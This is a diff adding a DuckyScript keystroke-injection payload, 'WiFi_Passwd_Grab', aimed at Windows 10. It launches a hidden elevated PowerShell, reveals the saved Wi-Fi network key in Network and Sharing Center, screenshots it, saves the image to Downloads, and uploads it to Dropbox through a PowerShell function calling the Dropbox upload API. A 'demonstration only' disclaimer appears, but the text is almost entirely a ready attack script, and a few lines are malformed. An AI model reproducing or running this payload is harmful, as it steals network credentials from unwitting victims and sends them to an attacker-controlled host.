@@ -1,0 +1,223 @@
+REM Title: WiFi_Passwd_Grab
+REM Author: LulzAnarchyAnon
+REM Description: This is a Three stage payload that begins by navagating to Network
+REM Description: and Sharing Center. It then opens the wireless properties security
+REM Description: tab, and makes the Network security key visible finally taking a screenshot.
+REM Description: In the Second stage the screenshot is saved to the Downloads folder.
+REM Description: In the Third, and final stage the screenshot is uploaded via Dropbox.
+REM Target: Windows 10 PowerShell
+REM Props: Darren Kitchen and I am Jakoby
+REM Version: 1.0
+REM Category: Exfiltration 
+
+REM This payload may need minor adjustments to run properly depending on 
+REM Attacker, and Target devices.
+
+REM Check out I am Jakoby on Youtube to set up your DropBox for uploads.
+
+REM THIS PAYLOAD IS FOR DEMONSTRATION PURPOSES ONLY, AND NOT INTENDED FOR MISUSE!
+
+
+REM Stage 1
+
+GUI r
+DELAY 200
+STRING powershell Start-Process PowerShell -verb runas -windowstyle hidden
+DELAY 1000
+ENTER
+DELAY 1000
+ALT Y
+DELAY 1000
+GUI r
+DELAY 1000
+STRING control.exe /name Microsoft.NetworkAndSharingCenter 
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+DELAY 1000
+CTRL TAB
+DELAY 1000
+TAB
+DELAY 1000
+SHIFT TAB
+DELAY 1000
+SHIFT TAB
+DELAY 1000
+SHIFT TAB
+DELAY 1000
+SHIFT TAB
+DELAY 1000
+SHIFT TAB
+DELAY 1000
+SHIFT TAB
+DELAY 1000
+SPACE
+DELAY 2000
+PRINTSCREEN
+DELAY 2000
+ALT F4
+DELAY 2000
+ALT F4
+DELAY 2000
+ALT F4
+DELAY 2000
+
+
+REM STAGE 2
+
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 2000
+STRING mspaint
+ENTER
+DELAY 5000
+CTRL v
+DELAY 1000
+CTRL s
+DELAY 1000
+ALT d
+DELAY 1000
+STRING %USERPROFILE%\Downloads
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+STRING wifipasswd
+DELAY 1000
+ALT s
+DELAY 1000
+ALT F4
+DELAY 5000
+
+
+STAGE 3
+
+GUI r
+DELAY 200
+STRING powershell 
+DELAY 200
+ENTER
+DELAY 2000
+
+STRING function DropBox-Upload {
+
+DELAY 500
+ENTER
+
+STRING [CmdletBinding()]
+DELAY 500
+ENTER
+STRING param (
+
+DELAY 500
+ENTER
+	
+STRING [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+DELAY 500
+ENTER
+STRING [Alias("f")]
+DELAY 500
+ENTER
+STRING [string]$SourceFilePath
+DELAY 500
+ENTER
+STRING ) 
+DELAY 500
+ENTER
+STRING $DropBoxAccessToken = "$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN-HERE
+DELAY 500
+ENTER
+STRING "   
+DELAY 500
+ENTER
+STRING $outputFile = Split-Path $SourceFilePath -leaf
+DELAY 500
+ENTER
+STRING $TargetFilePath="/$outputFile"
+DELAY 500
+ENTER
+STRING $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+DELAY 500
+ENTER
+STRING $authorization = "Bearer " + $DropBoxAccessToken
+DELAY 500
+ENTER
+STRING $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+DELAY 500
+ENTER
+STRING $headers.Add("Authorization", $authorization)
+DELAY 500
+ENTER
+STRING $headers.Add("Dropbox-API-Arg", $arg)
+DELAY 500
+ENTER
+STRING $headers.Add("Content-Type", 'application/octet-stream')
+DELAY 500
+ENTER
+STRING Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+DELAY 500
+ENTER
+STRING }
+DELAY 5000
+GUI r
+DELAY 200
+STRING %USERPROFILE%\Downloads\
+DELAY 500
+ENTER
+DELAY 500
+STRING wifipasswd
+DELAY 1000
+GUI r
+DELAY 500
+STRING %USERPROFILE%\Downloads\
+DELAY 500
+ENTER
+DELAY 500
+STRING wifipasswd
+DELAY 500
+ALT h
+DELAY 200
+TAB
+DELAY 200 
+TAB
+DELAY 200
+TAB
+DELAY 200 
+TAB
+DELAY 200
+TAB
+DELAY 500
+ENTER
+DELAY 500
+ALT F4
+DELAY 1000
+CTRL v
+DELAY 5000
+STRING | DropBox-Upload
+DELAY 500
+ENTER
+DELAY 5000
+ENTER
+ALT F4
+DELAY 100
+ENTER
